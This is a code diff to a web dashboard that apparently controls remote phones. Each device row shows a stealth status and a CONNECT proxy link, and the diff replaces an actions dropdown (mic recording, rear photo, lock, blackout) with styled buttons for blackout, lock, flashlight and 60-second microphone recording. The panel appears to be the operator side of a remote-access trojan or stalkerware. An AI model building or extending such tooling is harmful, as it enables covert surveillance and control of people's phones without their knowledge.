@@ -451,6 +451,22 @@ app.get('/', (req, res) => {
             if (d.flashlight) activeTags.push('<span style="color:var(--neon-yellow); font-size:0.58rem; background:rgba(255,255,0,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-yellow);">🔦 LIGHT</span>');
             const indicatorsHtml = activeTags.length > 0 ? `<div style="display:flex; gap:4px; margin-top:4px; flex-wrap:wrap;">${activeTags.join('')}</div>` : '';
 
+            const blackoutStyle = d.blackout ?
+                'background: rgba(57,255,20,0.2); color: var(--neon-green); border-color: var(--neon-green); box-shadow: 0 0 10px var(--neon-green);' :
+                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
+
+            const lockStyle = d.locked ?
+                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger);' :
+                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
+
+            const lightStyle = d.flashlight ?
+                'background: rgba(255,255,0,0.2); color: var(--neon-yellow); border-color: var(--neon-yellow); box-shadow: 0 0 10px var(--neon-yellow);' :
+                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
+
+            const micStyle = d.recording ?
+                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger); animation: pulse 1s infinite;' :
+                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -468,17 +484,12 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 6px;">
-                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
-                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
-                            <option value="" disabled selected>⚡ ACTIONS</option>
-                            <option value="mic">🎙️ Record Mic (60s)</option>
-                            <option value="flashlight">🔦 Toggle Flashlight</option>
-                            <option value="blackout">🕶️ Toggle Blackout</option>
-                            <option value="lock">🔒 Toggle Lock</option>
-                            <option value="volume">🔊 Max Vol + Vibrate</option>
-                            <option value="photo">📷 Quick Photo (Rear)</option>
-                        </select>
+                    <div style="display: inline-flex; align-items: center; gap: 5px;">
+                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 4px 8px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 0.6rem; display: inline-block;">CONNECT</a>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" title="Toggle Blackout" style="${blackoutStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🕶️</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" title="Toggle Lock" style="${lockStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🔒</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" title="Toggle Flashlight" style="${lightStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🔦</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" title="Record Mic (60s)" style="${micStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️</button>
                     </div>
                 </td>
             </tr>
